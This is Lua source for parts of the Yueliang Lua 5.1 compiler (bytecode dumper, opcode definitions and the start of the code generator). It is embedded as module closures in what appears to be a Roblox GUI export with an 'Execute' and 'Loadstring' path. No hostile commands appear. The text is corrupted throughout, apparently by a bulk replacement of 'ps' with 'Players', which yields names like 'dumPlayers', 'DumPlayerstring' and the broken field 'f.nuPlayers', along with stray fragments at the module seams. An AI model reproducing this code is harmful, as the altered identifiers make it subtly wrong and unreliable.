--[[--------------------------------------------------------------------
-- Notes:
-- * WARNING! byte order (little endian) and data type sizes for header
--   signature values hard-coded; see luaU:header
-- * chunk writer generators are included, see below
-- * one significant difference is that instructions are still in table
--   form (with OP/A/B/C/Bx fields) and luaP:Instruction() is needed to
--   convert them into 4-char strings
--
-- Not implemented:
-- * DumpVar, DumpMem has been removed
-- * DumpVector folded into folded into DumpDebug, DumpCode
--
-- Added:
-- * for convenience, the following two functions have been added:
--   luaU:make_setS: create a chunk writer that writes to a string
--   luaU:make_setF: create a chunk writer that writes to a file
--   (lua.h contains a typedef for lua_Writer/lua_Chunkwriter, and
--    a Lua-based implementation exists, writer() in lstrlib.c)
-- * luaU:ttype(o) (from lobject.h)
-- * for converting number types to its binary equivalent:
--   luaU:from_double(x): encode double value for writing
--   luaU:from_int(x): encode integer value for writing
--     (error checking is limited for these conversion functions)
--     (double conversion does not support denormals or NaNs)
--
-- Changed in 5.1.x:
-- * the dumper was mostly rewritten in Lua 5.1.x, so notes on the
--   differences between 5.0.x and 5.1.x is limited
-- * LUAC_VERSION bumped to 0x51, LUAC_FORMAT added
-- * developer is expected to adjust LUAC_FORMAT in order to identify
--   non-standard binary chunk formats
-- * header signature code is smaller, has been simplified, and is
--   tested as a single unit; its logic is shared with the undumper
-- * no more endian conversion, invalid endianness mean rejection
-- * opcode field sizes are no longer exposed in the header
-- * code moved to front of a prototype, followed by constants
-- * debug information moved to the end of the binary chunk, and the
--   relevant functions folded into a single function
-- * luaU:dump returns a writer status code
-- * chunk writer now implements status code because dumper uses it
-- * luaU:endianness removed
----------------------------------------------------------------------]]

--requires luaP
local luaU = {}
local luaP = require(script.Parent.LuaP)

-- mark for precompiled code ('<esc>Lua') (from lua.h)
luaU.LUA_SIGNATURE = "\27Lua"

-- constants used by dumper (from lua.h)
luaU.LUA_TNUMBER  = 3
luaU.LUA_TSTRING  = 4
luaU.LUA_TNIL     = 0
luaU.LUA_TBOOLEAN = 1
luaU.LUA_TNONE    = -1

-- constants for header of binary files (from lundump.h)
luaU.LUAC_VERSION    = 0x51     -- this is Lua 5.1
luaU.LUAC_FORMAT     = 0        -- this is the official format
luaU.LUAC_HEADERSIZE = 12       -- size of header of binary files

--[[--------------------------------------------------------------------
-- Additional functions to handle chunk writing
-- * to use make_setS and make_setF, see test_ldump.lua elsewhere
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- create a chunk writer that writes to a string
-- * returns the writer function and a table containing the string
-- * to get the final result, look in buff.data
------------------------------------------------------------------------
function luaU:make_setS()
  local buff = {}
        buff.data = ""
  local writer =
    function(s, buff)  -- chunk writer
      if not s then return 0 end
      buff.data = buff.data..s
      return 0
    end
  return writer, buff
end

------------------------------------------------------------------------
-- create a chunk writer that writes to a file
-- * returns the writer function and a table containing the file handle
-- * if a nil is passed, then writer should close the open file
------------------------------------------------------------------------

--[[
function luaU:make_setF(filename)
  local buff = {}
        buff.h = io.open(filename, "wb")
  if not buff.h then return nil end
  local writer =
    function(s, buff)  -- chunk writer
      if not buff.h then return 0 end
      if not s then
        if buff.h:close() then return 0 end
      else
        if buff.h:write(s) then return 0 end
      end
      return 1
    end
  return writer, buff
end--]]

------------------------------------------------------------------------
-- works like the lobject.h version except that TObject used in these
-- scripts only has a 'value' field, no 'tt' field (native types used)
------------------------------------------------------------------------
function luaU:ttype(o)
  local tt = type(o.value)
  if tt == "number" then return self.LUA_TNUMBER
  elseif tt == "string" then return self.LUA_TSTRING
  elseif tt == "nil" then return self.LUA_TNIL
  elseif tt == "boolean" then return self.LUA_TBOOLEAN
  else
    return self.LUA_TNONE  -- the rest should not appear
  end
end

-----------------------------------------------------------------------
-- converts a IEEE754 double number to an 8-byte little-endian string
-- * luaU:from_double() and luaU:from_int() are adapted from ChunkBake
-- * supports +/- Infinity, but not denormals or NaNs
-----------------------------------------------------------------------
function luaU:from_double(x)
  local function grab_byte(v)
    local c = v % 256
    return (v - c) / 256, string.char(c)
  end
  local sign = 0
  if x < 0 then sign = 1; x = -x end
  local mantissa, exponent = math.frexp(x)
  if x == 0 then -- zero
    mantissa, exponent = 0, 0
  elseif x == 1/0 then
    mantissa, exponent = 0, 2047
  else
    mantissa = (mantissa * 2 - 1) * math.ldexp(0.5, 53)
    exponent = exponent + 1022
  end
  local v, byte = "" -- convert to bytes
  x = math.floor(mantissa)
  for i = 1,6 do
    x, byte = grab_byte(x); v = v..byte -- 47:0
  end
  x, byte = grab_byte(exponent * 16 + x); v = v..byte -- 55:48
  x, byte = grab_byte(sign * 128 + x); v = v..byte -- 63:56
  return v
end

-----------------------------------------------------------------------
-- converts a number to a little-endian 32-bit integer string
-- * input value assumed to not overflow, can be signed/unsigned
-----------------------------------------------------------------------
function luaU:from_int(x)
  local v = ""
  x = math.floor(x)
  if x < 0 then x = 4294967296 + x end  -- ULONG_MAX+1
  for i = 1, 4 do
    local c = x % 256
    v = v..string.char(c); x = math.floor(x / 256)
  end
  return v
end

--[[--------------------------------------------------------------------
-- Functions to make a binary chunk
-- * many functions have the size parameter removed, since output is
--   in the form of a string and some sizes are implicit or hard-coded
----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- struct DumPlayerstate:
--   L  -- lua_State (not used in this script)
--   writer  -- lua_Writer (chunk writer function)
--   data  -- void* (chunk writer context or data already written)
--   strip  -- if true, don't write any debug information
--   status  -- if non-zero, an error has occured
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- dumPlayers a block of bytes
-- * lua_unlock(D.L), lua_lock(D.L) unused
------------------------------------------------------------------------
function luaU:DumpBlock(b, D)
  if D.status == 0 then
    -- lua_unlock(D->L);
    D.status = D.write(b, D.data)
    -- lua_lock(D->L);
  end
end

------------------------------------------------------------------------
-- dumPlayers a char
------------------------------------------------------------------------
function luaU:DumpChar(y, D)
  self:DumpBlock(string.char(y), D)
end

------------------------------------------------------------------------
-- dumPlayers a 32-bit signed or unsigned integer (for int) (hard-coded)
------------------------------------------------------------------------
function luaU:DumpInt(x, D)
  self:DumpBlock(self:from_int(x), D)
end

------------------------------------------------------------------------
-- dumPlayers a lua_Number (hard-coded as a double)
------------------------------------------------------------------------
function luaU:DumpNumber(x, D)
  self:DumpBlock(self:from_double(x), D)
end

------------------------------------------------------------------------
-- dumPlayers a Lua string (size type is hard-coded)
------------------------------------------------------------------------
function luaU:DumPlayerstring(s, D)
  if s == nil then
    self:DumpInt(0, D)
  else
    s = s.."\0"  -- include trailing '\0'
    self:DumpInt(#s, D)
    self:DumpBlock(s, D)
  end
end

------------------------------------------------------------------------
-- dumPlayers instruction block from function prototype
------------------------------------------------------------------------
function luaU:DumpCode(f, D)
  local n = f.sizecode
  --was DumpVector
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    self:DumpBlock(luaP:Instruction(f.code[i]), D)
  end
end

------------------------------------------------------------------------
-- dump constant pool from function prototype
-- * bvalue(o), nvalue(o) and rawtsvalue(o) macros removed
------------------------------------------------------------------------
function luaU:DumpConstants(f, D)
  local n = f.sizek
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    local o = f.k[i]  -- TValue
    local tt = self:ttype(o)
    self:DumpChar(tt, D)
    if tt == self.LUA_TNIL then
    elseif tt == self.LUA_TBOOLEAN then
      self:DumpChar(o.value and 1 or 0, D)
    elseif tt == self.LUA_TNUMBER then
      self:DumpNumber(o.value, D)
    elseif tt == self.LUA_TSTRING then
      self:DumPlayerstring(o.value, D)
    else
      --lua_assert(0)  -- cannot happen
    end
  end
  n = f.sizep
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    self:DumpFunction(f.p[i], f.source, D)
  end
end

------------------------------------------------------------------------
-- dump debug information
------------------------------------------------------------------------
function luaU:DumpDebug(f, D)
  local n
  n = D.strip and 0 or f.sizelineinfo           -- dump line information
  --was DumpVector
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    self:DumpInt(f.lineinfo[i], D)
  end
  n = D.strip and 0 or f.sizelocvars            -- dump local information
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    self:DumPlayerstring(f.locvars[i].varname, D)
    self:DumpInt(f.locvars[i].startpc, D)
    self:DumpInt(f.locvars[i].endpc, D)
  end
  n = D.strip and 0 or f.sizeupvalues           -- dump upvalue information
  self:DumpInt(n, D)
  for i = 0, n - 1 do
    self:DumPlayerstring(f.upvalues[i], D)
  end
end

------------------------------------------------------------------------
-- dump child function prototypes from function prototype
------------------------------------------------------------------------
function luaU:DumpFunction(f, p, D)
  local source = f.source
  if source == p or D.strip then source = nil end
  self:DumPlayerstring(source, D)
  self:DumpInt(f.lineDefined, D)
  self:DumpInt(f.lastlinedefined, D)
  self:DumpChar(f.nuPlayers, D)
  self:DumpChar(f.numparams, D)
  self:DumpChar(f.is_vararg, D)
  self:DumpChar(f.maxstacksize, D)
  self:DumpCode(f, D)
  self:DumpConstants(f, D)
  self:DumpDebug(f, D)
end

------------------------------------------------------------------------
-- dump Lua header section (some sizes hard-coded)
------------------------------------------------------------------------
function luaU:DumpHeader(D)
  local h = self:header()
  assert(#h == self.LUAC_HEADERSIZE) -- fixed buffer now an assert
  self:DumpBlock(h, D)
end

------------------------------------------------------------------------
-- make header (from lundump.c)
-- returns the header string
------------------------------------------------------------------------
function luaU:header()
 local x = 1
 return self.LUA_SIGNATURE..
        string.char(
          self.LUAC_VERSION,
          self.LUAC_FORMAT,
          x,                    -- endianness (1=little)
          4,                    -- sizeof(int)
          4,                    -- sizeof(size_t)
          4,                    -- sizeof(Instruction)
          8,                    -- sizeof(lua_Number)
          0)                    -- is lua_Number integral?
end

------------------------------------------------------------------------
-- dump Lua function as precompiled chunk
-- (lua_State* L, const Proto* f, lua_Writer w, void* data, int strip)
-- * w, data are created from make_setS, make_setF
------------------------------------------------------------------------
function luaU:dump(L, f, w, data, strip)
  local D = {}  -- DumPlayerstate
  D.L = L
  D.write = w
  D.data = data
  D.strip = strip
  D.status = 0
  self:DumpHeader(D)
  self:DumpFunction(f, nil, D)
  -- added: for a chunk writer writing to a file, this final call with
  -- nil data is to indicate to the writer to close the file
  D.write(nil, D.data)
  return D.status
end

return luaU
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaP
G2L_MODULES[G2L["402"]] = {
Closure = function()
local script = G2L["402"]
--[[--------------------------------------------------------------------

  lopcodes.lua
  Lua 5 virtual machine opcodes in Lua
  This file is part of Yueliang.

  Copyright (c) 2006 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- Notes:
-- * an Instruction is a table with OP, A, B, C, Bx elements; this
--   makes the code easy to follow and should allow instruction handling
--   to work with doubles and ints
-- * WARNING luaP:Instruction outputs instructions encoded in little-
--   endian form and field size and positions are hard-coded
--
-- Not implemented:
-- *
--
-- Added:
-- * luaP:CREATE_Inst(c): create an inst from a number (for OP_SETLIST)
-- * luaP:Instruction(i): convert field elements to a 4-char string
-- * luaP:DecodeInst(x): convert 4-char string into field elements
--
-- Changed in 5.1.x:
-- * POS_OP added, instruction field positions changed
-- * some symbol names may have changed, e.g. LUAI_BITSINT
-- * new operators for RK indices: BITRK, ISK(x), INDEXK(r), RKASK(x)
-- * OP_MOD, OP_LEN is new
-- * OP_TEST is now OP_TESTSET, OP_TEST is new
-- * OP_FORLOOP, OP_TFORLOOP adjusted, OP_FORPREP is new
-- * OP_TFORPREP deleted
-- * OP_SETLIST and OP_SETLISTO merged and extended
-- * OP_VARARG is new
-- * many changes to implementation of OpMode data
----------------------------------------------------------------------]]

local luaP = {}

--[[
===========================================================================
  We assume that instructions are unsigned numbers.
  All instructions have an opcode in the first 6 bits.
  Instructions can have the following fields:
        'A' : 8 bits
        'B' : 9 bits
        'C' : 9 bits
        'Bx' : 18 bits ('B' and 'C' together)
        'sBx' : signed Bx

  A signed argument is represented in excess K; that is, the number
  value is the unsigned value minus K. K is exactly the maximum value
  for that argument (so that -max is represented by 0, and +max is
  represented by 2*max), which is half the maximum for the corresponding
  unsigned argument.
===========================================================================
--]]

luaP.OpMode = { iABC = 0, iABx = 1, iAsBx = 2 }  -- basic instruction format

------------------------------------------------------------------------
-- size and position of opcode arguments.
-- * WARNING size and position is hard-coded elsewhere in this script
------------------------------------------------------------------------
luaP.SIZE_C  = 9
luaP.SIZE_B  = 9
luaP.SIZE_Bx = luaP.SIZE_C + luaP.SIZE_B
luaP.SIZE_A  = 8

luaP.SIZE_OP = 6

luaP.POS_OP = 0
luaP.POS_A  = luaP.POS_OP + luaP.SIZE_OP
luaP.POS_C  = luaP.POS_A + luaP.SIZE_A
luaP.POS_B  = luaP.POS_C + luaP.SIZE_C
luaP.POS_Bx = luaP.POS_C

------------------------------------------------------------------------
-- limits for opcode arguments.
-- we use (signed) int to manipulate most arguments,
-- so they must fit in LUAI_BITSINT-1 bits (-1 for sign)
------------------------------------------------------------------------
-- removed "#if SIZE_Bx < BITS_INT-1" test, assume this script is
-- running on a Lua VM with double or int as LUA_NUMBER

luaP.MAXARG_Bx  = math.ldexp(1, luaP.SIZE_Bx) - 1
luaP.MAXARG_sBx = math.floor(luaP.MAXARG_Bx / 2)  -- 'sBx' is signed

luaP.MAXARG_A = math.ldexp(1, luaP.SIZE_A) - 1
luaP.MAXARG_B = math.ldexp(1, luaP.SIZE_B) - 1
luaP.MAXARG_C = math.ldexp(1, luaP.SIZE_C) - 1

-- creates a mask with 'n' 1 bits at position 'p'
-- MASK1(n,p) deleted, not required
-- creates a mask with 'n' 0 bits at position 'p'
-- MASK0(n,p) deleted, not required

--[[--------------------------------------------------------------------
  Visual representation for reference:

   31    |    |     |            0      bit position
    +-----+-----+-----+----------+
    |  B  |  C  |  A  |  Opcode  |      iABC format
    +-----+-----+-----+----------+
    -  9  -  9  -  8  -    6     -      field sizes
    +-----+-----+-----+----------+
    |   [s]Bx   |  A  |  Opcode  |      iABx | iAsBx format
    +-----+-----+-----+----------+

----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- the following macros help to manipulate instructions
-- * changed to a table object representation, very clean compared to
--   the [nightmare] alternatives of using a number or a string
-- * Bx is a separate element from B and C, since there is never a need
--   to split Bx in the parser or code generator
------------------------------------------------------------------------

-- these accept or return opcodes in the form of string names
function luaP:GET_OPCODE(i) return self.ROpCode[i.OP] end
function luaP:SET_OPCODE(i, o) i.OP = self.OpCode[o] end

function luaP:GETARG_A(i) return i.A end
function luaP:SETARG_A(i, u) i.A = u end

function luaP:GETARG_B(i) return i.B end
function luaP:SETARG_B(i, b) i.B = b end

function luaP:GETARG_C(i) return i.C end
function luaP:SETARG_C(i, b) i.C = b end

function luaP:GETARG_Bx(i) return i.Bx end
function luaP:SETARG_Bx(i, b) i.Bx = b end

function luaP:GETARG_sBx(i) return i.Bx - self.MAXARG_sBx end
function luaP:SETARG_sBx(i, b) i.Bx = b + self.MAXARG_sBx end

function luaP:CREATE_ABC(o,a,b,c)
  return {OP = self.OpCode[o], A = a, B = b, C = c}
end

function luaP:CREATE_ABx(o,a,bc)
  return {OP = self.OpCode[o], A = a, Bx = bc}
end

------------------------------------------------------------------------
-- create an instruction from a number (for OP_SETLIST)
------------------------------------------------------------------------
function luaP:CREATE_Inst(c)
  local o = c % 64
  c = (c - o) / 64
  local a = c % 256
  c = (c - a) / 256
  return self:CREATE_ABx(o, a, c)
end

------------------------------------------------------------------------
-- returns a 4-char string little-endian encoded form of an instruction
------------------------------------------------------------------------
function luaP:Instruction(i)
  if i.Bx then
    -- change to OP/A/B/C format
    i.C = i.Bx % 512
    i.B = (i.Bx - i.C) / 512
  end
  local I = i.A * 64 + i.OP
  local c0 = I % 256
  I = i.C * 64 + (I - c0) / 256  -- 6 bits of A left
  local c1 = I % 256
  I = i.B * 128 + (I - c1) / 256  -- 7 bits of C left
  local c2 = I % 256
  local c3 = (I - c2) / 256
  return string.char(c0, c1, c2, c3)
end

------------------------------------------------------------------------
-- decodes a 4-char little-endian string into an instruction struct
------------------------------------------------------------------------
function luaP:DecodeInst(x)
  local byte = string.byte
  local i = {}
  local I = byte(x, 1)
  local op = I % 64
  i.OP = op
  I = byte(x, 2) * 4 + (I - op) / 64  -- 2 bits of c0 left
  local a = I % 256
  i.A = a
  I = byte(x, 3) * 4 + (I - a) / 256  -- 2 bits of c1 left
  local c = I % 512
  i.C = c
  i.B = byte(x, 4) * 2 + (I - c) / 512 -- 1 bits of c2 left
  local opmode = self.OpMode[tonumber(string.sub(self.opmodes[op + 1], 7, 7))]
  if opmode ~= "iABC" then
    i.Bx = i.B * 512 + i.C
  end
  return i
end

------------------------------------------------------------------------
-- Macros to operate RK indices
-- * these use arithmetic instead of bit oPlayers
------------------------------------------------------------------------

-- this bit 1 means constant (0 means register)
luaP.BITRK = math.ldexp(1, luaP.SIZE_B - 1)

-- test whether value is a constant
function luaP:ISK(x) return x >= self.BITRK end

-- gets the index of the constant
function luaP:INDEXK(x) return x - self.BITRK end

luaP.MAXINDEXRK = luaP.BITRK - 1

-- code a constant index as a RK value
function luaP:RKASK(x) return x + self.BITRK end

------------------------------------------------------------------------
-- invalid register that fits in 8 bits
------------------------------------------------------------------------
luaP.NO_REG = luaP.MAXARG_A

------------------------------------------------------------------------
-- R(x) - register
-- Kst(x) - constant (in constant table)
-- RK(x) == if ISK(x) then Kst(INDEXK(x)) else R(x)
------------------------------------------------------------------------

------------------------------------------------------------------------
-- grep "ORDER OP" if you change these enums
------------------------------------------------------------------------

--[[--------------------------------------------------------------------
Lua virtual machine opcodes (enum OpCode):
------------------------------------------------------------------------
name          args    description
------------------------------------------------------------------------
OP_MOVE       A B     R(A) := R(B)
OP_LOADK      A Bx    R(A) := Kst(Bx)
OP_LOADBOOL   A B C   R(A) := (Bool)B; if (C) pc++
OP_LOADNIL    A B     R(A) := ... := R(B) := nil
OP_GETUPVAL   A B     R(A) := UpValue[B]
OP_GETGLOBAL  A Bx    R(A) := Gbl[Kst(Bx)]
OP_GETTABLE   A B C   R(A) := R(B)[RK(C)]
OP_SETGLOBAL  A Bx    Gbl[Kst(Bx)] := R(A)
OP_SETUPVAL   A B     UpValue[B] := R(A)
OP_SETTABLE   A B C   R(A)[RK(B)] := RK(C)
OP_NEWTABLE   A B C   R(A) := {} (size = B,C)
OP_SELF       A B C   R(A+1) := R(B); R(A) := R(B)[RK(C)]
OP_ADD        A B C   R(A) := RK(B) + RK(C)
OP_SUB        A B C   R(A) := RK(B) - RK(C)
OP_MUL        A B C   R(A) := RK(B) * RK(C)
OP_DIV        A B C   R(A) := RK(B) / RK(C)
OP_MOD        A B C   R(A) := RK(B) % RK(C)
OP_POW        A B C   R(A) := RK(B) ^ RK(C)
OP_UNM        A B     R(A) := -R(B)
OP_NOT        A B     R(A) := not R(B)
OP_LEN        A B     R(A) := length of R(B)
OP_CONCAT     A B C   R(A) := R(B).. ... ..R(C)
OP_JMP        sBx     pc+=sBx
OP_EQ         A B C   if ((RK(B) == RK(C)) ~= A) then pc++
OP_LT         A B C   if ((RK(B) <  RK(C)) ~= A) then pc++
OP_LE         A B C   if ((RK(B) <= RK(C)) ~= A) then pc++
OP_TEST       A C     if not (R(A) <=> C) then pc++
OP_TESTSET    A B C   if (R(B) <=> C) then R(A) := R(B) else pc++
OP_CALL       A B C   R(A), ... ,R(A+C-2) := R(A)(R(A+1), ... ,R(A+B-1))
OP_TAILCALL   A B C   return R(A)(R(A+1), ... ,R(A+B-1))
OP_RETURN     A B     return R(A), ... ,R(A+B-2)  (see note)
OP_FORLOOP    A sBx   R(A)+=R(A+2);
                      if R(A) <?= R(A+1) then { pc+=sBx; R(A+3)=R(A) }
OP_FORPREP    A sBx   R(A)-=R(A+2); pc+=sBx
OP_TFORLOOP   A C     R(A+3), ... ,R(A+2+C) := R(A)(R(A+1), R(A+2));
                      if R(A+3) ~= nil then R(A+2)=R(A+3) else pc++
OP_SETLIST    A B C   R(A)[(C-1)*FPF+i] := R(A+i), 1 <= i <= B
OP_CLOSE      A       close all variables in the stack up to (>=) R(A)
OP_CLOSURE    A Bx    R(A) := closure(KPROTO[Bx], R(A), ... ,R(A+n))
OP_VARARG     A B     R(A), R(A+1), ..., R(A+B-1) = vararg
----------------------------------------------------------------------]]

luaP.opnames = {}  -- opcode names
luaP.OpCode = {}   -- lookup name -> number
luaP.ROpCode = {}  -- lookup number -> name

------------------------------------------------------------------------
-- ORDER OP
------------------------------------------------------------------------
local i = 0
for v in string.gmatch([[
MOVE LOADK LOADBOOL LOADNIL GETUPVAL
GETGLOBAL GETTABLE SETGLOBAL SETUPVAL SETTABLE
NEWTABLE SELF ADD SUB MUL
DIV MOD POW UNM NOT
LEN CONCAT JMP EQ LT
LE TEST TESTSET CALL TAILCALL
RETURN FORLOOP FORPREP TFORLOOP SETLIST
CLOSE CLOSURE VARARG
]], "%S+") do
  local n = "OP_"..v
  luaP.opnames[i] = v
  luaP.OpCode[n] = i
  luaP.ROpCode[i] = n
  i = i + 1
end
luaP.NUM_OPCODES = i

--[[
===========================================================================
  Notes:
  (*) In OP_CALL, if (B == 0) then B = top. C is the number of returns - 1,
      and can be 0: OP_CALL then sets 'top' to last_result+1, so
      next open instruction (OP_CALL, OP_RETURN, OP_SETLIST) may use 'top'.
  (*) In OP_VARARG, if (B == 0) then use actual number of varargs and
      set top (like in OP_CALL with C == 0).
  (*) In OP_RETURN, if (B == 0) then return up to 'top'
  (*) In OP_SETLIST, if (B == 0) then B = 'top';
      if (C == 0) then next 'instruction' is real C
  (*) For comparisons, A specifies what condition the test should accept
      (true or false).
  (*) All 'skiPlayers' (pc++) assume that next instruction is a jump
===========================================================================
--]]

--[[--------------------------------------------------------------------
  masks for instruction properties. The format is:
  bits 0-1: op mode
  bits 2-3: C arg mode
  bits 4-5: B arg mode
  bit 6: instruction set register A
  bit 7: operator is a test

  for OpArgMask:
  OpArgN - argument is not used
  OpArgU - argument is used
  OpArgR - argument is a register or a jump offset
  OpArgK - argument is a constant or register/constant
----------------------------------------------------------------------]]

-- was enum OpArgMask
luaP.OpArgMask = { OpArgN = 0, OpArgU = 1, OpArgR = 2, OpArgK = 3 }

------------------------------------------------------------------------
-- e.g. to compare with symbols, luaP:getOpMode(...) == luaP.OpCode.iABC
-- * accepts opcode parameter as strings, e.g. "OP_MOVE"
------------------------------------------------------------------------

function luaP:getOpMode(m)
  return self.opmodes[self.OpCode[m]] % 4
end

function luaP:getBMode(m)
  return math.floor(self.opmodes[self.OpCode[m]] / 16) % 4
end

function luaP:getCMode(m)
  return math.floor(self.opmodes[self.OpCode[m]] / 4) % 4
end

function luaP:testAMode(m)
  return math.floor(self.opmodes[self.OpCode[m]] / 64) % 2
end

function luaP:testTMode(m)
  return math.floor(self.opmodes[self.OpCode[m]] / 128)
end

-- luaP_opnames[] is set above, as the luaP.opnames table

-- number of list items to accumulate before a SETLIST instruction
luaP.LFIELDS_PER_FLUSH = 50

------------------------------------------------------------------------
-- build instruction properties array
-- * deliberately coded to look like the C equivalent
------------------------------------------------------------------------
local function opmode(t, a, b, c, m)
  local luaP = luaP
  return t * 128 + a * 64 +
         luaP.OpArgMask[b] * 16 + luaP.OpArgMask[c] * 4 + luaP.OpMode[m]
end

-- ORDER OP
luaP.opmodes = {
-- T A B C mode opcode
  opmode(0, 1, "OpArgK", "OpArgN", "iABx"),     -- OP_LOADK
  opmode(0, 1, "OpArgU", "OpArgU", "iABC"),     -- OP_LOADBOOL
  opmode(0, 1, "OpArgR", "OpArgN", "iABC"),     -- OP_LOADNIL
  opmode(0, 1, "OpArgU", "OpArgN", "iABC"),     -- OP_GETUPVAL
  opmode(0, 1, "OpArgK", "OpArgN", "iABx"),     -- OP_GETGLOBAL
  opmode(0, 1, "OpArgR", "OpArgK", "iABC"),     -- OP_GETTABLE
  opmode(0, 0, "OpArgK", "OpArgN", "iABx"),     -- OP_SETGLOBAL
  opmode(0, 0, "OpArgU", "OpArgN", "iABC"),     -- OP_SETUPVAL
  opmode(0, 0, "OpArgK", "OpArgK", "iABC"),     -- OP_SETTABLE
  opmode(0, 1, "OpArgU", "OpArgU", "iABC"),     -- OP_NEWTABLE
  opmode(0, 1, "OpArgR", "OpArgK", "iABC"),     -- OP_SELF
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_ADD
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_SUB
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_MUL
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_DIV
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_MOD
  opmode(0, 1, "OpArgK", "OpArgK", "iABC"),     -- OP_POW
  opmode(0, 1, "OpArgR", "OpArgN", "iABC"),     -- OP_UNM
  opmode(0, 1, "OpArgR", "OpArgN", "iABC"),     -- OP_NOT
  opmode(0, 1, "OpArgR", "OpArgN", "iABC"),     -- OP_LEN
  opmode(0, 1, "OpArgR", "OpArgR", "iABC"),     -- OP_CONCAT
  opmode(0, 0, "OpArgR", "OpArgN", "iAsBx"),    -- OP_JMP
  opmode(1, 0, "OpArgK", "OpArgK", "iABC"),     -- OP_EQ
  opmode(1, 0, "OpArgK", "OpArgK", "iABC"),     -- OP_LT
  opmode(1, 0, "OpArgK", "OpArgK", "iABC"),     -- OP_LE
  opmode(1, 1, "OpArgR", "OpArgU", "iABC"),     -- OP_TEST
  opmode(1, 1, "OpArgR", "OpArgU", "iABC"),     -- OP_TESTSET
  opmode(0, 1, "OpArgU", "OpArgU", "iABC"),     -- OP_CALL
  opmode(0, 1, "OpArgU", "OpArgU", "iABC"),     -- OP_TAILCALL
  opmode(0, 0, "OpArgU", "OpArgN", "iABC"),     -- OP_RETURN
  opmode(0, 1, "OpArgR", "OpArgN", "iAsBx"),    -- OP_FORLOOP
  opmode(0, 1, "OpArgR", "OpArgN", "iAsBx"),    -- OP_FORPREP
  opmode(1, 0, "OpArgN", "OpArgU", "iABC"),     -- OP_TFORLOOP
  opmode(0, 0, "OpArgU", "OpArgU", "iABC"),     -- OP_SETLIST
  opmode(0, 0, "OpArgN", "OpArgN", "iABC"),     -- OP_CLOSE
  opmode(0, 1, "OpArgU", "OpArgN", "iABx"),     -- OP_CLOSURE
  opmode(0, 1, "OpArgU", "OpArgN", "iABC"),     -- OP_VARARG
}
-- an awkward way to set a zero-indexed table...
luaP.opmodes[0] =
  opmode(0, 1, "OpArgR", "OpArgN", "iABC")      -- OP_MOVE

return luaP
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaK
G2L_MODULES[G2L["403"]] = {
Closure = function()
local script = G2L["403"]
--[[--------------------------------------------------------------------

  lcode.lua
  Lua 5 code generator in Lua
  This file is part of Yueliang.

  Copyright (c) 2005-2007 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- Notes:
-- * one function manipulate a pointer argument with a simple data type
--   (can't be emulated by a table, ambiguous), now returns that value:
--   luaK:concat(fs, l1, l2)
-- * luaM_growvector uses the faux luaY:growvector, for limit checking
-- * some function parameters changed to boolean, additional code
--   translates boolean back to 1/0 for instruction fields
--
-- Not implemented:
-- * NOTE there is a failed assert in luaK:addk, a porting problem
--
-- Added:
-- * constant MAXSTACK from llimits.h
-- * luaK:ttisnumber(o) (from lobject.h)
-- * luaK:nvalue(o) (from lobject.h)
-- * luaK:setnilvalue(o) (from lobject.h)
-- * luaK:setnvalue(o, x) (from lobject.h)
-- * luaK:setbvalue(o, x) (from lobject.h)
-- * luaK:sethvalue(o, x) (from lobject.h), parameter L deleted
-- * luaK:setsvalue(o, x) (from lobject.h), parameter L deleted
-- * luaK:numadd, luaK:numsub, luaK:nummul, luaK:numdiv, luaK:nummod,
--   luaK:numpow, luaK:numunm, luaK:numisnan (from luaconf.h)
-- * copyexp(e1, e2) added in luaK:posfix to copy expdesc struct
--
-- Changed in 5.1.x:
-- * enum BinOpr has a new entry, OPR_MOD
-- * enum UnOpr has a new entry, OPR_LEN
-- * binopistest, unused in 5.0.x, has been deleted
-- * macro setmultret is new
-- * functions isnumeral, luaK_ret, boolK are new
-- * funcion nilK was named nil_constant in 5.0.x
-- * function interface changed: need_value, patchtestreg, concat
-- * TObject now a TValue
-- * functions luaK_setreturns, luaK_setoneret are new
-- * function luaK:setcallreturns deleted, to be replaced by:
--   luaK:setmultret, luaK:ret, luaK:setreturns, luaK:setoneret
-- * functions constfolding, codearith, codecomp are new
-- * luaK:codebinop has been deleted
-- * function luaK_setlist is new
-- * OPR_MULT renamed to OPR_MUL
----------------------------------------------------------------------]]

-- requires luaP, luaX, luaY
local luaK = {}
local luaP = require(script.Parent.LuaP)
local luaX = require(script.Parent.LuaX)

------------------------------------------------------------------------
-- constants used by code generator
------------------------------------------------------------------------
-- maximum stack for a Lua function
luaK.MAXSTACK = 250  -- (from llimits.h)

--[[--------------------------------------------------------------------
-- other functions
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- emulation of TValue macros (these are from lobject.h)
-- * TValue is a table since lcode passes references around
-- * tt member field removed, using Lua's type() instead
-- * for setsvalue, sethvalue, parameter L (deleted here) in lobject.h
--   is used in an assert for testing, see checkliveness(g,obj)
------------------------------------------------------------------------
function luaK:ttisnumber(o)
  if o then return type(o.value) == "number" else return false end
end
function luaK:nvalue(o) return o.value end
function luaK:setnilvalue(o) o.value = nil end
function luaK:setsvalue(o, x) o.value = x end
luaK.setnvalue = luaK.setsvalue
luaK.sethvalue = luaK.setsvalue
luaK.setbvalue = luaK.setsvalue

------------------------------------------------------------------------
-- The luai_num* macros define the primitive operations over numbers.
